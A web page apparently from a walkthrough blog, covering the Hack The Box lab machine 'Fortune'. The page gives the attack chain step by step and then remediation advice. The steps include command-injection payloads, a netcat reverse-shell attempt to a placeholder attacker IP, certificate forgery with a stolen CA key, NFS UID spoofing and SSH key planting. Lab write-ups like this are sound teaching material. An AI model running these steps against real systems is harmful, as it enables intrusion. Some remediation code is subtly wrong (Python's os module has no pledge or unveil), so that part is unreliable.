<!doctype html><html lang=en><head><title>Fortune HTB - Insane OpenBSD Box Walkthrough :: VAPT Walkthroughs</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Complete walkthrough of Fortune HTB machine featuring command injection exploitation, SSL client certificate generation, authpf firewall bypass, NFS share enumeration with UID manipulation, and PostgreSQL password decryption for root access"><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=https://malayamanas.github.io/posts/fortune-htb-walkthrough/><link rel=stylesheet href=https://malayamanas.github.io/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css><link rel=stylesheet href=https://malayamanas.github.io/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css><link rel=stylesheet href=https://malayamanas.github.io/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css><link rel=stylesheet href=https://malayamanas.github.io/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css><link rel=stylesheet href=https://malayamanas.github.io/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=https://malayamanas.github.io/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css><link rel=stylesheet href=https://malayamanas.github.io/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css><link rel=stylesheet href=https://malayamanas.github.io/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css><link rel=stylesheet href=https://malayamanas.github.io/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css><link rel=stylesheet href=https://malayamanas.github.io/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css><link rel=stylesheet href=https://malayamanas.github.io/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css><link rel=stylesheet href=https://malayamanas.github.io/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css><link rel=stylesheet href=https://malayamanas.github.io/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel=stylesheet href=https://malayamanas.github.io/terminal.css><link rel="shortcut icon" href=https://malayamanas.github.io/favicon.png><link rel=apple-touch-icon href=https://malayamanas.github.io/apple-touch-icon.png><meta name=twitter:card content="summary"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Fortune HTB - Insane OpenBSD Box Walkthrough"><meta property="og:description" content="Complete walkthrough of Fortune HTB machine featuring command injection exploitation, SSL client certificate generation, authpf firewall bypass, NFS share enumeration with UID manipulation, and PostgreSQL password decryption for root access"><meta property="og:url" content="https://malayamanas.github.io/posts/fortune-htb-walkthrough/"><meta property="og:site_name" content="VAPT Walkthroughs"><meta property="og:image" content="https://malayamanas.github.io/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:section" content="HTB"><meta property="article:section" content="OpenBSD"><meta property="article:published_time" content="2025-09-22 08:45:00 +0000 UTC"></head><body><div class=container><header class=header><div class=header__inner><div class=header__logo><a href=https://malayamanas.github.io/><div class=logo>Terminal</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/>Home</a></li><li><a href=/search>Search</a></li><li><a href=/tags>Tags</a></li><li><a href=/difficulty>Difficulty</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/>Home</a></li><li><a href=/search>Search</a></li><li><a href=/tags>Tags</a></li><li><a href=/difficulty>Difficulty</a></li></ul></nav></header><div class=content><article class=post><h1 class=post-title><a href=https://malayamanas.github.io/posts/fortune-htb-walkthrough/>Fortune HTB - Insane OpenBSD Box Walkthrough</a></h1><div class=post-meta><time class=post-date>2025-09-22</time></div><span class=post-tags>#<a href=https://malayamanas.github.io/tags/insane-openbsd/>insane-openbsd</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/web/>web</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/command-injection/>command-injection</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/ssl/>ssl</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/certificate/>certificate</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/ssh/>ssh</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/authpf/>authpf</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/nfs/>nfs</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/uid-manipulation/>uid-manipulation</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/postgresql/>postgresql</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/pgadmin/>pgadmin</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/crypto/>crypto</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/privilege-escalation/>privilege-escalation</a>&nbsp;</span><div class=post-content><div><h1 id=fortune-htb---insane-openbsd-box-walkthrough>Fortune HTB - Insane OpenBSD Box Walkthrough<a href=#fortune-htb---insane-openbsd-box-walkthrough class=hanchor arialabel=Anchor>#</a></h1><div style=position:relative;padding-bottom:56.25%;height:0;overflow:hidden><iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading=eager referrerpolicy=strict-origin-when-cross-origin src="https://www.youtube.com/embed/_BLd046r-co?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style=position:absolute;top:0;left:0;width:100%;height:100%;border:0 title="YouTube video"></iframe></div><h2 id=exploitation-steps>Exploitation Steps<a href=#exploitation-steps class=hanchor arialabel=Anchor>#</a></h2><p>Below is a chronological extraction of the key exploitation steps and techniques used in the &ldquo;Fortune&rdquo; Hack The Box challenge, as described in the provided transcript:</p><ol><li><p><strong>Initial Reconnaissance with Nmap</strong></p><ul><li><strong>Technique</strong>: Port scanning and service enumeration</li><li><strong>Step</strong>: Ran <code>nmap -sC -sV -oA nmap/fortune [TARGET-IP]</code> to identify open ports and services.</li><li><strong>Findings</strong>:<ul><li>Port 22 (SSH, OpenSSH 7.9)</li><li>Port 80 (HTTP, OpenBSD httpd)</li><li>Port 443 (HTTPS, requires client certificate, TLS randomness issue noted)</li></ul></li></ul></li><li><p><strong>Web Enumeration on Port 443 (HTTPS)</strong></p><ul><li><strong>Technique</strong>: SSL certificate analysis</li><li><strong>Step</strong>: Visited <code>https://[TARGET-IP]</code>, encountered a client certificate requirement. Used <code>openssl s_client -connect [TARGET-IP]:443</code> to retrieve the certificate.</li><li><strong>Findings</strong>: Identified potential users (<code>charlie</code> and <code>bob</code>) and hostname (<code>fortune.htb</code>). Noted an intermediate CA for compartmentalized security.</li></ul></li><li><p><strong>Web Enumeration on Port 80 (HTTP)</strong></p><ul><li><strong>Technique</strong>: Manual web interaction and proxy interception</li><li><strong>Step</strong>: Visited <code>http://[TARGET-IP]</code>, found a fortune database selection page. Used Burp Suite to intercept requests and test inputs (e.g., <code>db=star_trek</code>).</li><li><strong>Findings</strong>: Page displayed random fortunes; no immediate errors on invalid inputs.</li></ul></li><li><p><strong>Fuzzing for Command Injection</strong></p><ul><li><strong>Technique</strong>: Special character fuzzing with <code>wfuzz</code></li><li><strong>Step</strong>: Used <code>wfuzz -w /usr/share/seclists/Fuzzing/special-chars.txt -d "db=star_trek&amp;FUZZ" http://[TARGET-IP]/select</code> to test special characters (<code>&</code>, <code>\</code>, <code>;</code>, <code>+</code>). Filtered responses by hiding 293-byte responses (indicating no fortune).</li><li><strong>Findings</strong>:<ul><li><code>&</code> and <code>;</code> caused abnormal responses, suggesting command injection.</li><li><code>+</code> likely converted to a space, causing a false positive.</li><li>Confirmed command injection with <code>;id</code>, which executed and returned output.</li></ul></li></ul></li><li><p><strong>Exploiting Command Injection</strong></p><ul><li><strong>Technique</strong>: Command injection via POST parameter</li><li><strong>Step</strong>: Tested commands like <code>;which nc</code> (confirmed Netcat presence) and attempted reverse shell (<code>;nc -lvnp 443 [ATTACKER-IP]</code>), but failed due to firewall. Used <code>;tcpdump -i any icmp</code> to confirm ICMP connectivity.</li><li><strong>Findings</strong>: Command injection allowed arbitrary command execution, but outbound connections were blocked.</li></ul></li><li><p><strong>Automating Command Injection with Python Script</strong></p><ul><li><strong>Technique</strong>: Scripting for pseudo-shell</li><li><strong>Step</strong>: Created a Python script (<code>cmd_inject.py</code>) using the <code>requests</code> library to send POST requests with injected commands (e.g., <code>db=echo -n please_support_me;cmd;echo -n on_patreon</code>). Used regex to extract command output between markers.</li><li><strong>Findings</strong>: Established a reliable pseudo-shell for executing commands and retrieving output.</li></ul></li><li><p><strong>System Enumeration via Pseudo-Shell</strong></p><ul><li><strong>Technique</strong>: File and process enumeration</li><li><strong>Step</strong>: Ran commands like <code>ps -ax</code>, <code>find /var/www</code>, and <code>ls -la /var/www</code> to explore the system. Identified a Flask app (<code>fortune.py</code>) and a PostgreSQL password file (<code>/var/www/ssh_auth/pg_pass</code>).</li><li><strong>Findings</strong>:<ul><li>Discovered <code>fortune.py</code> (vulnerable Flask app with no input sanitization via <code>os.popen</code>).</li><li>Found <code>ssh_auth.py</code> and <code>authpf</code> configuration, indicating SSH-based firewall rule updates.</li></ul></li></ul></li><li><p><strong>Certificate Generation for Port 443 Access</strong></p><ul><li><strong>Technique</strong>: SSL client certificate creation</li><li><strong>Step</strong>:<ul><li>Located intermediate CA certificate (<code>intermediate.cert.pem</code>) and key (<code>intermediate.key</code>) in <code>/home/bob</code>.</li><li>Generated a private key (<code>openssl genrsa -out ipsec.key 2048</code>), certificate signing request (<code>openssl req -new -key ipsec.key -out ipsec.csr</code>), and signed certificate (<code>openssl x509 -req -in ipsec.csr -CA intermediate.cert -CAkey intermediate.key -out ipsec.pem</code>).</li><li>Packaged certificate into PKCS12 format (<code>openssl pkcs12 -export -out ipsec.pfx -inkey ipsec.key -in ipsec.pem -certfile intermediate.cert</code>) and imported into Firefox.</li><li>Adjusted system time to resolve certificate validation issues.</li></ul></li><li><strong>Findings</strong>: Successfully accessed <code>https://fortune.htb</code>, which provided an SSH key for the <code>nfsuser</code>.</li></ul></li><li><p><strong>SSH Access as <code>nfsuser</code></strong></p><ul><li><strong>Technique</strong>: SSH authentication with provided key</li><li><strong>Step</strong>: Used <code>ssh -i fortune.ssh nfsuser@[TARGET-IP]</code> to log in. Ran <code>nmap -v [TARGET-IP]</code> to discover new ports (111, 8081, 2049).</li><li><strong>Findings</strong>: Gained shell as <code>nfsuser</code>; new ports opened due to <code>authpf</code> rules (BSD packet filter).</li></ul></li><li><p><strong>NFS Share Exploitation</strong></p><ul><li><strong>Technique</strong>: NFS mounting and UID manipulation</li><li><strong>Step</strong>:<ul><li>Installed <code>nfs-common</code> and ran <code>showmount -e [TARGET-IP]</code> to identify <code>/home</code> share accessible to everyone.</li><li>Mounted the share (<code>mount -t nfs -o vers=2 [TARGET-IP]:/home /mnt</code>).</li><li>Modified local user <code>pleasesub</code> UID to 1000 (matching <code>charlie</code>) to access <code>/mnt/charlie</code>.</li></ul></li><li><strong>Findings</strong>: Accessed <code>charlie</code>&rsquo;s home directory, including <code>user.txt</code> and an <code>mbox</code> file indicating the PostgreSQL password equals the root password.</li></ul></li><li><p><strong>SSH Access as <code>charlie</code></strong></p><ul><li><strong>Technique</strong>: SSH key injection</li><li><strong>Step</strong>: Generated an SSH key pair (<code>ssh-keygen -f charlie.ssh</code>), added the public key to <code>/mnt/charlie/.ssh/authorized_keys</code>, and logged in (<code>ssh -i charlie.ssh charlie@[TARGET-IP]</code>).</li><li><strong>Findings</strong>: Gained shell as <code>charlie</code>.</li></ul></li><li><p><strong>PostgreSQL Database Access</strong></p><ul><li><strong>Technique</strong>: SQLite database query</li><li><strong>Step</strong>: Accessed <code>/var/www/pgadmin4.db</code> (SQLite3 database) as <code>charlie</code>. Queried <code>SELECT * FROM user</code> and <code>SELECT * FROM server</code> to retrieve encrypted credentials.</li><li><strong>Findings</strong>: Found encrypted PostgreSQL credentials in the <code>server</code> table.</li></ul></li><li><p><strong>Decrypting PostgreSQL Password</strong></p><ul><li><strong>Technique</strong>: Source code analysis and decryption</li><li><strong>Step</strong>:<ul><li>Located <code>pgadmin4.ini</code> and <code>crypto.py</code> in the web application source.</li><li>Identified decryption function in <code>crypto.py</code> using a key from <code>user.password</code>.</li><li>Copied <code>crypto.py</code> to local system, used <code>charlie</code>&rsquo;s password (from <code>mbox</code>) to decrypt the ciphertext, revealing the PostgreSQL password.</li></ul></li><li><strong>Findings</strong>: Decrypted password matched the root password.</li></ul></li><li><p><strong>Root Privilege Escalation</strong></p><ul><li><strong>Technique</strong>: Password reuse</li><li><strong>Step</strong>: Used the decrypted PostgreSQL password to <code>su root</code>.</li><li><strong>Findings</strong>: Successfully escalated to root, completing the box.</li></ul></li></ol><p><strong>Summary of Techniques</strong>:</p><ul><li>Port scanning (Nmap)</li><li>SSL certificate analysis (OpenSSL)</li><li>Web fuzzing and command injection (wfuzz, Burp Suite)</li><li>Python scripting for pseudo-shell</li><li>Client certificate generation (OpenSSL)</li><li>SSH authentication and key injection</li><li>NFS share mounting and UID manipulation</li><li>SQLite database querying</li><li>Source code analysis and decryption</li></ul><p>This attack chain leveraged web vulnerabilities, SSL certificate creation, NFS misconfiguration, and password reuse to achieve root access on an OpenBSD system.</p><h2 id=security-gaps-and-remediation>Security Gaps and Remediation<a href=#security-gaps-and-remediation class=hanchor arialabel=Anchor>#</a></h2><p>Based on the provided transcript of the &ldquo;Fortune&rdquo; Hack The Box challenge, several vulnerabilities in services and systems were exploited to achieve root access. Below is a list of the identified gaps in each service or system, along with recommended fixes, categorized by whether they require a source code fix or a configuration fix.</p><hr><h3 id=1-web-application-http-on-port-80---flask-app-fortunepy>1. <strong>Web Application (HTTP on Port 80 - Flask App: fortune.py)</strong><a href=#1-web-application-http-on-port-80---flask-app-fortunepy class=hanchor arialabel=Anchor>#</a></h3><p><strong>Gap</strong>: Command Injection Vulnerability</p><ul><li><strong>Description</strong>: The Flask application (<code>fortune.py</code>) accepts a <code>db</code> parameter via a POST request and uses it in a shell command via <code>os.popen</code> without sanitization, allowing arbitrary command execution (e.g., <code>;id</code>, <code>;ls</code>).</li><li><strong>Impact</strong>: Attackers can execute arbitrary commands on the server, leading to unauthorized access, data leakage, or full system compromise.</li><li><strong>Fix Type</strong>: Source Code Fix</li><li><strong>Recommended Fix</strong>:<ul><li><strong>Input Sanitization</strong>: Modify <code>fortune.py</code> to sanitize the <code>db</code> parameter. Use a whitelist of allowed database names (e.g., <code>star_trek</code>, <code>quotes</code>) and reject any input containing special characters (e.g., <code>;</code>, <code>&</code>, <code>\</code>, <code>+</code>). Example in Python:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>allowed_dbs <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;star_trek&#39;</span>, <span style=color:#e6db74>&#39;quotes&#39;</span>]
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> selection <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> allowed_dbs:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>raise</span> <span style=color:#a6e22e>ValueError</span>(<span style=color:#e6db74>&#34;Invalid database selection&#34;</span>)
</span></span><span style=display:flex><span>shell_command <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;cmd </span><span style=color:#e6db74>{</span>selection<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>  <span style=color:#75715e># Ensure no injection is possible</span>
</span></span></code></pre></div></li><li><strong>Avoid <code>os.popen</code></strong>: Replace <code>os.popen</code> with a safer method, such as direct database queries or a secure subprocess call with proper argument escaping (e.g., <code>subprocess.run</code> with a list of arguments). Example:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> subprocess
</span></span><span style=display:flex><span>result <span style=color:#f92672>=</span> subprocess<span style=color:#f92672>.</span>run([<span style=color:#e6db74>&#39;cmd&#39;</span>, selection], capture_output<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>, text<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
</span></span></code></pre></div></li><li><strong>HTML Entity Encoding</strong>: Ensure output is properly encoded to prevent cross-site scripting (XSS) if applicable, using libraries like <code>html</code> in Python.</li></ul></li></ul><hr><h3 id=2-https-service-port-443---ssl-certificate-authentication>2. <strong>HTTPS Service (Port 443 - SSL Certificate Authentication)</strong><a href=#2-https-service-port-443---ssl-certificate-authentication class=hanchor arialabel=Anchor>#</a></h3><p><strong>Gap</strong>: Improper Certificate Validation and Time-Based Rejection</p><ul><li><strong>Description</strong>: The HTTPS service requires a client certificate signed by an intermediate CA but rejects certificates due to a time mismatch between the server and client. Additionally, the intermediate CA certificate and key are accessible in a world-readable directory (<code>/home/bob</code>), allowing attackers to forge valid client certificates.</li><li><strong>Impact</strong>: Attackers can forge client certificates to access restricted services, and time mismatches cause unnecessary rejections, complicating legitimate access.</li><li><strong>Fix Type</strong>: Configuration Fix</li><li><strong>Recommended Fix</strong>:<ul><li><strong>Secure CA Storage</strong>: Restrict access to the intermediate CA certificate and key (<code>intermediate.cert.pem</code>, <code>intermediate.key</code>) by setting proper permissions (e.g., <code>chmod 600 /home/bob/intermediate.*</code> and <code>chown root:root /home/bob/intermediate.*</code>). Move sensitive files to a secure directory (e.g., <code>/etc/ssl/private</code>).</li><li><strong>Time Synchronization</strong>: Configure the server to use Network Time Protocol (NTP) to ensure accurate time, preventing certificate validation failures. On OpenBSD:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>rcctl enable ntpd
</span></span><span style=display:flex><span>rcctl start ntpd
</span></span></code></pre></div></li><li><strong>Strengthen Certificate Validation</strong>: Enforce stricter certificate validation policies, such as requiring specific Organizational Unit (OU) fields or revoking compromised certificates via a Certificate Revocation List (CRL). Update the web server configuration (e.g., OpenBSD <code>httpd.conf</code>) to enforce these checks:<pre tabindex=0><code class=language-conf data-lang=conf>SSLVerifyClient require
SSLVerifyDepth 2
SSLCARevocationFile /etc/ssl/crl.pem
</code></pre></li></ul></li></ul><hr><h3 id=3-ssh-service-port-22---authpf-integration>3. <strong>SSH Service (Port 22 - authpf Integration)</strong><a href=#3-ssh-service-port-22---authpf-integration class=hanchor arialabel=Anchor>#</a></h3><p><strong>Gap</strong>: Automatic Firewall Rule Updates via <code>authpf</code></p><ul><li><strong>Description</strong>: The <code>authpf</code> service modifies BSD packet filter (<code>pf</code>) rules upon successful SSH login as <code>nfsuser</code>, opening additional ports (e.g., 111, 8081, 2049) to the client&rsquo;s IP. This exposes sensitive services like NFS without sufficient restrictions.</li><li><strong>Impact</strong>: Unauthorized users gaining SSH access can expose internal services, increasing the attack surface.</li><li><strong>Fix Type</strong>: Configuration Fix</li><li><strong>Recommended Fix</strong>:<ul><li><strong>Restrict <code>authpf</code> Rules</strong>: Modify <code>/etc/authpf/authpf.rules</code> to limit opened ports to specific, necessary services and restrict access to trusted IPs or networks. Example:<pre tabindex=0><code class=language-pf data-lang=pf>ext_if = &#34;em0&#34;
pass in quick on $ext_if proto { tcp, udp } from $user_ip to $ext_if port { 22, 80 } keep state
</code></pre></li><li><strong>Disable <code>authpf</code> for Unprivileged Users</strong>: Restrict <code>authpf</code> usage to administrative users, not low-privilege accounts like <code>nfsuser</code>. Update <code>/etc/authpf/authpf.conf</code> or remove <code>authpf</code> from <code>nfsuser</code>&rsquo;s shell in <code>/etc/passwd</code>.</li><li><strong>SSH Hardening</strong>: Enforce stronger SSH authentication (e.g., multi-factor authentication) and disable password-based logins for <code>nfsuser</code>. Edit <code>/etc/ssh/sshd_config</code>:<pre tabindex=0><code class=language-conf data-lang=conf>PasswordAuthentication no
AllowUsers admin
</code></pre></li></ul></li></ul><hr><h3 id=4-nfs-service-port-2049>4. <strong>NFS Service (Port 2049)</strong><a href=#4-nfs-service-port-2049 class=hanchor arialabel=Anchor>#</a></h3><p><strong>Gap</strong>: Unrestricted NFS Share Access</p><ul><li><strong>Description</strong>: The NFS share (<code>/home</code>) is configured with the <code>everyone</code> option, allowing any client to mount it. NFS version 2 lacks authentication, relying on client-provided UIDs, enabling attackers to manipulate local UIDs to access restricted directories (e.g., <code>charlie</code>&rsquo;s home).</li><li><strong>Impact</strong>: Attackers can access sensitive files (e.g., <code>user.txt</code>, <code>.ssh/authorized_keys</code>) by spoofing UIDs, leading to privilege escalation.</li><li><strong>Fix Type</strong>: Configuration Fix</li><li><strong>Recommended Fix</strong>:<ul><li><strong>Restrict NFS Access</strong>: Update <code>/etc/exports</code> to limit the <code>/home</code> share to specific IP addresses or subnets and enforce read-only access if possible. Example:<pre tabindex=0><code class=language-exports data-lang=exports>/home -ro -network 10.10.10.0/24
</code></pre></li><li><strong>Use NFSv4 with Authentication</strong>: Upgrade to NFSv4, which supports Kerberos-based authentication and stronger access controls. Configure <code>/etc/exports</code> for NFSv4:<pre tabindex=0><code class=language-exports data-lang=exports>/home -sec=krb5 -network 10.10.10.0/24
</code></pre></li><li><strong>Restrict Directory Permissions</strong>: Ensure user home directories are not world-readable (e.g., <code>chmod 700 /home/*</code>). Prevent unauthorized access to <code>.ssh</code> directories:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>chmod <span style=color:#ae81ff>700</span> /home/*/ .ssh
</span></span><span style=display:flex><span>chmod <span style=color:#ae81ff>600</span> /home/*/ .ssh/authorized_keys
</span></span></code></pre></div></li></ul></li></ul><hr><h3 id=5-postgresqlpgadmin-service-database-access>5. <strong>PostgreSQL/pgAdmin Service (Database Access)</strong><a href=#5-postgresqlpgadmin-service-database-access class=hanchor arialabel=Anchor>#</a></h3><p><strong>Gap</strong>: Weak Password Storage and Reuse</p><ul><li><strong>Description</strong>: The PostgreSQL password is stored encrypted in <code>pgadmin4.db</code> but decrypted using a key derived from <code>charlie</code>&rsquo;s password, which is reused as the root password. The database file and decryption script (<code>crypto.py</code>) are accessible to <code>charlie</code>.</li><li><strong>Impact</strong>: Password reuse and accessible decryption logic allow attackers to escalate to root privileges.</li><li><strong>Fix Type</strong>: Configuration Fix and Source Code Fix</li><li><strong>Recommended Fix</strong>:<ul><li><strong>Configuration Fix</strong>:<ul><li><strong>Secure File Permissions</strong>: Restrict access to <code>pgadmin4.db</code> and <code>crypto.py</code> to the <code>appserve</code> user or root (e.g., <code>chmod 600 /var/www/pgadmin4.db</code>, <code>chown appserve /var/www/pgadmin4.db</code>).</li><li><strong>Eliminate Password Reuse</strong>: Ensure the PostgreSQL password differs from the root password. Update the password in the PostgreSQL configuration and <code>pgadmin4.db</code>. Example for PostgreSQL:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>psql -U postgres -c <span style=color:#e6db74>&#34;ALTER USER postgres WITH PASSWORD &#39;new_secure_password&#39;;&#34;</span>
</span></span></code></pre></div></li><li><strong>Use Environment Variables</strong>: Store sensitive keys in environment variables or a secure vault (e.g., HashiCorp Vault) instead of hardcoding or deriving from user passwords.</li></ul></li><li><strong>Source Code Fix</strong>:<ul><li><strong>Secure Key Management</strong>: Modify <code>crypto.py</code> to use a securely generated key stored in a protected location (e.g., <code>/etc/pgadmin/secret.key</code>) instead of deriving from <code>user.password</code>. Example:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> cryptography.fernet <span style=color:#f92672>import</span> Fernet
</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;/etc/pgadmin/secret.key&#39;</span>, <span style=color:#e6db74>&#39;rb&#39;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>    key <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span>cipher <span style=color:#f92672>=</span> Fernet(key)
</span></span><span style=display:flex><span>decrypted_password <span style=color:#f92672>=</span> cipher<span style=color:#f92672>.</span>decrypt(ciphertext)
</span></span></code></pre></div></li><li><strong>Use Strong Encryption</strong>: Ensure encryption uses a secure algorithm (e.g., Fernet) and a unique, randomly generated key per instance.</li></ul></li></ul></li></ul><hr><h3 id=6-general-system-configuration>6. <strong>General System Configuration</strong><a href=#6-general-system-configuration class=hanchor arialabel=Anchor>#</a></h3><p><strong>Gap</strong>: Insecure File Permissions and Lack of Least Privilege</p><ul><li><strong>Description</strong>: Sensitive files (e.g., <code>/var/www/ssh_auth/pg_pass</code>, <code>/home/bob/intermediate.*</code>) have overly permissive permissions, allowing unauthorized access. The <code>nfsuser</code> account has excessive privileges via <code>authpf</code>.</li><li><strong>Impact</strong>: Attackers can read or modify sensitive files, escalating privileges or exposing credentials.</li><li><strong>Fix Type</strong>: Configuration Fix</li><li><strong>Recommended Fix</strong>:<ul><li><strong>Enforce Least Privilege</strong>: Audit and restrict file permissions across the system. Use <code>find / -perm -o+rwx</code> to identify world-readable/writable files and fix them (e.g., <code>chmod 600 &lt;file></code>, <code>chown root:root &lt;file></code>).</li><li><strong>Restrict <code>nfsuser</code> Privileges</strong>: Change <code>nfsuser</code>&rsquo;s shell to a restricted shell (e.g., <code>/sbin/nologin</code>) or remove <code>authpf</code> capabilities. Edit <code>/etc/passwd</code>:<pre tabindex=0><code class=language-passwd data-lang=passwd>nfsuser:*:1002:1002:NFS User:/home/nfsuser:/sbin/nologin
</code></pre></li><li><strong>Implement Mandatory Access Controls</strong>: Use OpenBSD&rsquo;s <code>pledge</code> or <code>unveil</code> to restrict application access to only necessary resources. Example for <code>fortune.py</code>:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span>os<span style=color:#f92672>.</span>unveil(<span style=color:#e6db74>&#34;/var/www/fortunes&#34;</span>, <span style=color:#e6db74>&#34;r&#34;</span>)  <span style=color:#75715e># Restrict filesystem access</span>
</span></span><span style=display:flex><span>os<span style=color:#f92672>.</span>pledge(<span style=color:#e6db74>&#34;stdio rpath&#34;</span>)  <span style=color:#75715e># Restrict syscalls</span>
</span></span></code></pre></div></li></ul></li></ul><hr><h3 id=summary-table-of-gaps-and-fixes>Summary Table of Gaps and Fixes<a href=#summary-table-of-gaps-and-fixes class=hanchor arialabel=Anchor>#</a></h3><table><thead><tr><th><strong>Service/System</strong></th><th><strong>Gap</strong></th><th><strong>Fix Type</strong></th><th><strong>Recommended Fix</strong></th></tr></thead><tbody><tr><td>Web App (Port 80)</td><td>Command Injection</td><td>Source Code</td><td>Sanitize inputs, avoid <code>os.popen</code>, encode outputs</td></tr><tr><td>HTTPS (Port 443)</td><td>Insecure CA Storage, Time Mismatch</td><td>Configuration</td><td>Secure CA files, enable NTP, enforce strict validation</td></tr><tr><td>SSH (Port 22)</td><td>Overly Permissive <code>authpf</code> Rules</td><td>Configuration</td><td>Restrict <code>authpf</code> rules, disable for unprivileged users, harden SSH</td></tr><tr><td>NFS (Port 2049)</td><td>Unrestricted Share Access</td><td>Configuration</td><td>Limit share access, use NFSv4, secure directory permissions</td></tr><tr><td>PostgreSQL/pgAdmin</td><td>Weak Password Storage, Reuse</td><td>Configuration & Source Code</td><td>Secure file permissions, eliminate reuse, use secure key management</td></tr><tr><td>General System</td><td>Insecure Permissions, Excessive Privileges</td><td>Configuration</td><td>Enforce least privilege, restrict <code>nfsuser</code>, use <code>pledge</code>/<code>unveil</code></td></tr></tbody></table><hr><h3 id=additional-recommendations>Additional Recommendations<a href=#additional-recommendations class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Regular Auditing</strong>: Use tools like <code>lynis</code> or <code>pfctl -sr</code> to audit system configurations and firewall rules.</li><li><strong>Patch Management</strong>: Ensure OpenBSD and all services (e.g., OpenSSH, httpd, PostgreSQL) are updated to the latest versions.</li><li><strong>Monitoring and Logging</strong>: Enable detailed logging for <code>httpd</code>, <code>sshd</code>, and <code>pf</code> to detect and respond to suspicious activity. Example for <code>httpd</code>:<pre tabindex=0><code class=language-conf data-lang=conf>server &#34;default&#34; {
    listen on * port 80
    log style combined
}
